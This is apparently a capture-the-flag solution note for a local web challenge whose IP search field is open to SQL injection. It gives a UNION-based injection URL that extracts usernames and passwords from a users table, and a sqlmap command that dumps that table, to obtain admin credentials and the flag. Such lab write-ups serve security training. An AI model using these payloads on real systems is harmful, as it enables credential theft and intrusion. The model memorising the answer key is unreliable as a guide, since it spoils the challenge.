Challenger must notice IP search field is vulnerable to SQL injection

Can either be solved manually using Union injection, or with sqlmap

Manual:
```
http://localhost:3003/?ip=127.0.0.1%27+union+select+id%2Cusername%2Cpassword%2C4%2C5+from+users%3B--+-
```

Sqlmap:
```
sqlmap.py -u "http://localhost:3003/?ip=127.0.0.1" -T users --dump
```

This shows the admin username and password which can be used to login to the application and read the flag
